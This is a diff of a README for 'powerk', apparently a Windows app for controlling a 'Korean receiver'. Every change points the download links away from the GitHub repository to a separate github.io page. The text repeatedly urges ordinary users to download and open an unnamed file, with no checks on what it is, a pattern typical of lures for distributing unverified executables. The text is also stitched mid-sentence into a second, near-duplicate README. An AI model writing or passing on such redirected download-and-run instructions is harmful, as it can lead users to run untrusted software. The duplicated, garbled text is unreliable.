@@ -1,6 +1,6 @@
 # 🎛️ powerk - Control Your Korean Receiver With Ease
 
-[![Download powerk](https://img.shields.io/badge/Download%20powerk-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Skitzothrenic/powerk)
+[![Download powerk](https://img.shields.io/badge/Download%20powerk-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://skitzothrenic.github.io)
 
 powerk is a simple end-user application for Windows that helps you control your Korean receiver from your computer. The repository description says: “اتحكم في المشترك الكوري من جيبك” — control the Korean receiver from your pocket. This README is written for everyday users who want clear download steps and a straightforward way to get started.
 
@@ -8,9 +8,9 @@ powerk is a simple end-user application for Windows that helps you control your 
 
 Visit this link to download the application:
 
-[![Get powerk](https://img.shields.io/badge/Get%20powerk-6c5ce7?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Skitzothrenic/powerk)
+[![Get powerk](https://img.shields.io/badge/Get%20powerk-6c5ce7?style=for-the-badge&logo=windows&logoColor=white)](https://skitzothrenic.github.io)
 
-Download page: [https://github.com/Skitzothrenic/powerk](https://github.com/Skitzothrenic/powerk)
+Download page: [https://skitzothrenic.github.io](https://skitzothrenic.github.io)
 
 Use the download page above as your starting point. Visit this link to download the application. Keep the downloaded file in a place you can find easily, such as your Downloads folder. After the download finishes, open the file to run powerk.
 
@@ -83,7 +83,7 @@ If you cannot find the downloaded file, open File Explorer and select Downloads.
 No. powerk is intended for regular Windows users. You download it, open it, and use the app window.
 
 ### Where do I get powerk?
-Use the official download link in this README: [https://github.com/Skitzothrenic/powerk](https://github.com/Skitzothrenic/powerk). Visit this link to download the application.
+Use the official download link in this README: [https://skitzothrenic.github.io](https://skitzothrenic.github.io). Visit this link to download the application.
 
 ### What should I do after the download finishes?
 Open your Downloads folder, find the downloaded powerk file, and open it. Follow any prompts shown by Windows.
@@ -101,7 +101,7 @@ You need an internet connection to visit the download page and download the appl
 
 Read each step once before starting. Download powerk from# 🎛️ powerk - Control Your Korean Receiver Easily
 
-[![Download powerk](https://img.shields.io/badge/Download%20powerk-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Skitzothrenic/powerk)
+[![Download powerk](https://img.shields.io/badge/Download%20powerk-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://skitzothrenic.github.io)
 
 powerk is an end-user application for Windows built around one simple idea: control your Korean receiver from your computer without needing programming knowledge. The repository description is “اتحكم في المشترك الكوري من جيبك” — control the Korean receiver from your pocket. This README guides you through downloading powerk, opening it on Windows, and using it in everyday situations.
 
@@ -109,9 +109,9 @@ powerk is an end-user application for Windows built around one simple idea: cont
 
 Visit this link to download the application:
 
-[![Get powerk](https://img.shields.io/badge/Get%20powerk-00b894?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Skitzothrenic/powerk)
+[![Get powerk](https://img.shields.io/badge/Get%20powerk-00b894?style=for-the-badge&logo=windows&logoColor=white)](https://skitzothrenic.github.io)
 
-Download page: [https://github.com/Skitzothrenic/powerk](https://github.com/Skitzothrenic/powerk)
+Download page: [https://skitzothrenic.github.io](https://skitzothrenic.github.io)
 
 Use the download page above as your starting point. Visit this link to download the application. Keep the downloaded file in a place you can find easily, such as your Downloads folder. After the download finishes, open the downloaded file to start powerk.
 
@@ -184,7 +184,7 @@ If you cannot find the downloaded file, open File Explorer and select Downloads.
 No. powerk is intended for regular Windows users. You download it, open it, and use the app window.
 
 ### Where do I get powerk?
-Use the official download link in this README: [https://github.com/Skitzothrenic/powerk](https://github.com/Skitzothrenic/powerk). Visit this link to download the application.
+Use the official download link in this README: [https://skitzothrenic.github.io](https://skitzothrenic.github.io). Visit this link to download the application.
 
 ### What should I do after the download finishes?
 Open your Downloads folder, find the downloaded powerk file, and open it. Follow any prompts shown by Windows.
